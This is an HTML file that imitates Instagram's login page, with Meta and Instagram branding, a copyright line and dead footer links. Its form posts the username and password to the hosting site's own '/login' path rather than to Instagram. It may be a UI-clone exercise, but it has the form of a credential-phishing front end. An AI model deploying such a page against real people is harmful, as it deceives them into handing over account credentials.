<!-- index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <title>Instagram</title>

  <link rel="icon" type="image/png" href="/assets/logo.png">
  <link rel="stylesheet" href="/assets/style.css">
</head>

<body>

  <!-- HEADER -->
  <header class="header">
    <img src="/assets/logo.png" alt="Instagram Logo">
  </header>

  <!-- MAIN -->
  <main class="main-content">

    <!-- LEFT DESKTOP -->
    <section class="left-section">

      <h1 class="hero-title">
        See everyday moments from your
        <span class="gradient-text">
          close friends.
        </span>
      </h1>

      <img
        src="/assets/hero.png"
        alt="Hero"
        class="hero-image"
      >

    </section>

    <!-- RIGHT -->
    <section class="right-section">

      <div class="login-box">

        <!-- TOP -->
        <div class="login-top">
          <span class="back-arrow">‹</span>
          <span>Log into Instagram</span>
        </div>

        <!-- FORM -->
        <form method="POST" action="/login">

          <input
            type="text"
            name="username"
            placeholder="Mobile number, username or email"
            class="ig-input"
            required
          >

          <input
            type="password"
            name="password"
            placeholder="Password"
            class="ig-input"
            required
          >

          <button type="submit" class="ig-btn">
            Log in
          </button>

        </form>

        <!-- FORGOT -->
        <div class="forgot-password clickable">
          Forgot password?
        </div>

        <!-- DIVIDER -->
        <div class="divider">
          OR
        </div>

        <!-- FACEBOOK -->
        <div class="secondary-btn clickable">
          Log in with Facebook
        </div>

        <!-- CREATE -->
        <div class="outline-btn clickable">
          Create new account
        </div>

        <!-- META -->
        <div class="meta-text">
          Meta
        </div>

      </div>

    </section>

  </main>

  <!-- FOOTER -->
  <footer>

    <div class="footer-links">
      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">Help</a>
      <a href="#">API</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Threads</a>
      <a href="#">Meta Verified</a>
    </div>

    <div class="footer-bottom">

      <select>
        <option>English</option>
        <option>Bahasa Indonesia</option>
      </select>

      <span>© 2026 Instagram from Meta</span>

    </div>

  </footer>

</body>
</html>
